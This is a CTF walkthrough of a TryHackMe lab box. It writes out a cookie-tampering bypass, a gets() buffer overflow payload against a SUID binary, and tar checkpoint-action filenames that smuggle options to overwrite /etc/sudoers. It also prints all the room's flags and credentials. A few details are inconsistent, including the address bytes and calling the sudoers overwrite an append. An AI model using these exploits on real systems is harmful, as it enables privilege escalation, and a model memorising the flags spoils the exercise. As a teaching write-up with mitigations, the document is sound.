# Anonymous Playground CTF Walkthrough

**Target:** Anonymous Playground
**Source:** [TryHackMe](https://tryhackme.com/room/anonymousplayground)
**Difficulty:** Hard
**Objective:** Get 2 user flags and 1 root flag
**Target IP:** 10.82.150.201

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration & Cookie Tampering](#web-enumeration--cookie-tampering)
- [Custom Cipher Decryption](#custom-cipher-decryption)
- [Initial Foothold via SSH (magna)](#initial-foothold-via-ssh-magna)
- [Reverse Engineering hacktheworld](#reverse-engineering-hacktheworld)
- [Buffer Overflow → Second Foothold (spooky)](#buffer-overflow--second-foothold-spooky)
- [Privilege Escalation via tar Checkpoint Abuse](#privilege-escalation-via-tar-checkpoint-abuse)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Anonymous Playground is a hard-difficulty Linux box that chains a cookie-
based access control bypass, a custom substitution cipher, and a stack
buffer overflow against a SUID binary into a two-stage user compromise,
before finishing with a classic GNU `tar` checkpoint/checkpoint-action
wildcard-injection privilege escalation to root. The intended path
deliberately avoids any single "big" exploit, instead rewarding careful
manual analysis at every stage — client-side state tampering, cipher
reverse engineering, and binary exploitation with `radare2`.

**Key Skills Required:**
- Web enumeration and client-side cookie/storage tampering
- Custom cipher cryptanalysis (Python scripting)
- Binary reverse engineering (`radare2`)
- Stack buffer overflow exploitation (offset discovery, return-address overwrite)
- GTFOBins-style `tar` checkpoint-action privilege escalation

---

## Reconnaissance

### Network Scanning

```bash
nmap -sVC -O -Pn 10.82.150.201
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) |

Nmap's `robots.txt` NSE script flags a disallowed path worth investigating
directly:

```
| http-robots.txt: 1 disallowed entry
|_/zYdHuAKjP
```

---

## Web Enumeration & Cookie Tampering

```bash
curl http://10.82.150.201
curl http://10.82.150.201/operatives.php
```

The `operatives.php` page lists a roster of codenames with no further
context (one of them, `magna`, becomes relevant later):

```
themayor, spooky, darkstar, akaelite, ninja, w0rmer, nameless0ne, 0day,
szymex, ma1ware, paradox, bee, iamwill, jammy, magna, cryillic, skidy,
naughty, thealchemist, itsundae
```

```bash
curl http://10.82.150.201/robots.txt
```

```
User-agent: *
Disallow: /zYdHuAKjP
```

Visiting `/zYdHuAKjP/` directly returns an access-denied message. Checking
the browser's developer tools (Storage tab) reveals a cookie whose value
is literally `denied`. Editing that cookie value from `denied` to
`granted` and refreshing unlocks the page:

```
Access granted.
Well done getting this far. But can you go further?

hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
```

---

## Custom Cipher Decryption

The unlocked string is clearly not standard base64 or hex — it uses a
restricted alphabet (`A–J` paired with letters), suggesting a custom
substitution scheme. A Python script is written to reverse it:

```bash
nano decrypt.py
chmod +x decrypt.py
python3 decrypt.py
```

```
magna :: magnaisanelephant
```

Recovered credentials: `magna : magnaisanelephant`

---

## Initial Foothold via SSH (magna)

```bash
ssh magna@10.82.150.201
```

```bash
magna@ip-10-82-150-201:~$ ls -l
-r-------- 1 magna  magna    33 Jul  4  2020 flag.txt
-rwsr-xr-x 1 root   root   8528 Jul 10  2020 hacktheworld
-rw-r--r-- 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt
```

```bash
magna@ip-10-82-150-201:~$ cat flag.txt
9184177ecaa83073cbbf36f1414cc029
```

> **User flag 1:** `9184177ecaa83073cbbf36f1414cc029`

A note from `spooky` points directly at the SUID binary sitting in the
home directory:

```
Hey Magna,

Check out this binary I made! I've been practicing my skills in C so that
I can get better at Reverse Engineering and Malware Development. I think
this is a really good start. See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and
reverse it right here!

Best,
Spooky
```

---

## Reverse Engineering hacktheworld

```bash
r2 hacktheworld
[0x00400570]> aaaa
[0x00400570]> afll
```

The function list highlights a `sym.call_bash` function that is clearly
the exploitation target — it calls `setuid(1337)` before dropping into
`system("/bin/sh")`:

```bash
[0x00400570]> s sym.call_bash
[0x00400657]> pdf
```

```
0x004006bf  mov edi, 0x539   ; 1337
0x004006c4  call sym.imp.setuid
0x004006c9  lea rdi, qword str.bin_sh ; "/bin/sh"
0x004006d0  call sym.imp.system
```

The function's entry address is noted for later use as the return-address
overwrite target:

```
sys call_bash address: 0x00400658
little endian: \x58\x06\x04\x00\x00\x00
```

`main` uses `gets()`, a function with no bounds checking, giving a classic
stack buffer overflow primitive.

---

## Buffer Overflow → Second Foothold (spooky)

The offset to the saved return address is found by crashing the binary
with increasing payload sizes:

```bash
python -c 'print "D"*70' | ./hacktheworld   # prompt returns, no crash
python -c 'print "D"*72' | ./hacktheworld   # Segmentation fault
```

```
offset: 72
```

Appending the `call_bash` address (little-endian) past the offset
redirects execution into the vulnerable function:

```bash
python -c 'print "D"*72 + "\x58\x06\x40\x00\x00\x00"' | ./hacktheworld
```

```
Who do you want to hack?
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
Segmentation fault (core dumped)
```

`call_bash` executes successfully (all the flavor text prints), but the
spawned shell exits immediately because there's no stdin left for it to
read from. Chaining the payload with `cat` keeps a live pipe open for
interactive commands:

```bash
(python -c 'print "D"*72 + "\x58\x06\x40\x00\x00\x00"';cat) | ./hacktheworld
```

```
whoami
spooky
```

A PTY upgrade makes the shell fully interactive:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
spooky@ip-10-82-150-201:~$ cat flag.txt
69ee352fb139c9d0699f6f399b63d9d7
```

> **User flag 2:** `69ee352fb139c9d0699f6f399b63d9d7`

---

## Privilege Escalation via tar Checkpoint Abuse

`spooky`'s home directory contains oddly-named files that hint at the
intended escalation path:

```bash
ls
'--checkpoint=1'  '--checkpoint-action=exec=sh shell.sh'   flag.txt   shell.sh
```

These filenames are a GNU `tar` checkpoint-action injection primitive: if
a privileged process later runs `tar` against a directory containing files
literally named `--checkpoint=1` and `--checkpoint-action=exec=sh ...`,
`tar` interprets them as command-line options rather than filenames,
executing an arbitrary script as whatever user invoked `tar`. A payload is
staged to grant `spooky` passwordless root via sudoers:

```bash
echo 'echo "spooky ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
echo "" > "--checkpoint-action=exec=sh demo.sh"
echo "" > --checkpoint=1
```

Once the privileged `tar` job (presumably a backup cron) runs against the
directory, the `sudoers` entry is appended and `sudo` becomes immediately
usable without a password:

```bash
sudo bash
```

```bash
root@ip-10-82-150-201:/home/spooky# whoami
root
# cd /root
# cat flag.txt
bc55a426e98deb673beabda50f24ce66
```

> **Root flag:** `bc55a426e98deb673beabda50f24ce66`

---

## Room Answers

| # | Flag | Value |
|---|------|-------|
| 1 | User flag 1 (magna) | `9184177ecaa83073cbbf36f1414cc029` |
| 2 | User flag 2 (spooky) | `69ee352fb139c9d0699f6f399b63d9d7` |
| 3 | Root flag | `bc55a426e98deb673beabda50f24ce66` |

---

## Vulnerabilities

### 1. Client-Side-Only Access Control via Cookie Value (High)

**Description:** Access to `/zYdHuAKjP/` was gated entirely by a cookie
whose literal value (`denied`/`granted`) was trusted by the server with no
server-side session validation.

**Impact:** Trivial bypass of an access-restricted page by editing a
single client-side value.

**Mitigation:**
- Never trust client-supplied state for access control decisions.
- Use server-side session tokens validated against a backend store.

### 2. Weak Custom Cipher Protecting Credentials (Medium)

**Description:** SSH credentials for `magna` were protected only by a
bespoke, undocumented substitution cipher rather than any standard,
vetted cryptographic scheme.

**Impact:** The entire protection was reversed with a short custom script
once the pattern was identified.

**Mitigation:** Never roll a custom cipher for protecting real
credentials; use established, audited cryptographic primitives — or
better, don't expose credentials through a reversible encoding at all.

### 3. SUID Binary with Unbounded `gets()` Call (Critical)

**Description:** `hacktheworld`, installed SUID and reachable by `magna`,
reads user input with `gets()`, which performs no bounds checking,
enabling a classic stack buffer overflow.

**Impact:** Full control of the saved return address, used to redirect
execution into an internal function that drops a `setuid`-privileged shell
as `spooky`.

**Mitigation:**
- Never use `gets()`; use bounded input functions (`fgets`, `scanf` with
  explicit width limits) instead.
- Compile with stack canaries, ASLR, and NX enabled, and avoid SUID bits on
  binaries that process untrusted input unless absolutely necessary.

### 4. Dangerous, Unreachable Debug Function Left in Production Binary (High)

**Description:** `call_bash()`, a function that calls `setuid(1337)` then
`system("/bin/sh")`, was compiled into the binary and reachable only via
the overflow — effectively a built-in backdoor once control flow could be
redirected.

**Impact:** Provided a ready-made, fully-privileged shell as the overflow
target, rather than requiring shellcode injection.

**Mitigation:** Remove debug/test code paths that spawn shells or alter
privileges before shipping any binary, especially one installed with
elevated permissions.

### 5. GNU tar Checkpoint-Action Wildcard Injection (Critical)

**Description:** A privileged process (likely a scheduled backup) ran
`tar` against a directory where an unprivileged user could create files
named to be interpreted as `tar` command-line options
(`--checkpoint=1`, `--checkpoint-action=exec=...`), enabling arbitrary
command execution in that process's context.

**Impact:** Full privilege escalation to root by appending a
passwordless-sudo rule to `/etc/sudoers`.

**Mitigation:**
- Never run `tar`, `chown`, `rsync`, or similar tools with a wildcard or
  directory argument supplied by or writable by untrusted users.
- Use `--` to terminate option parsing, or reference files by an explicit,
  non-glob list, in any privileged archive/backup job.

---

## Attack Chain Summary

```
Nmap scan → SSH, HTTP
    ↓
robots.txt → /zYdHuAKjP (access denied) → cookie "denied" → "granted"
    ↓
Access granted → custom cipher string revealed
    ↓
decrypt.py → magna:magnaisanelephant
    ↓
ssh magna → foothold, user flag 1, note_from_spooky.txt → hacktheworld (SUID)
    ↓
r2 hacktheworld → sym.call_bash (setuid(1337) + system("/bin/sh"))
    ↓
gets() buffer overflow → offset 72 → overwrite return addr → call_bash
    ↓
(payload; cat) | ./hacktheworld → foothold: spooky, user flag 2
    ↓
--checkpoint=1 / --checkpoint-action files staged in home dir
    ↓
privileged tar job triggers → sudoers rewritten → sudo bash → root
    ↓
root flag
    ↓
Room complete
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| cURL | Fetching web content |
| Browser DevTools | Cookie/storage inspection and tampering |
| Python | Custom cipher decryption and overflow payload crafting |
| radare2 (r2) | Binary reverse engineering |
| ssh | Foothold and second-stage access |
| GNU tar checkpoint-action (GTFOBins-style) | Privilege escalation |

---

## References

- [TryHackMe — Anonymous Playground](https://tryhackme.com/room/anonymousplayground)
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
- [radare2 (GitHub)](https://github.com/radareorg/radare2)

---
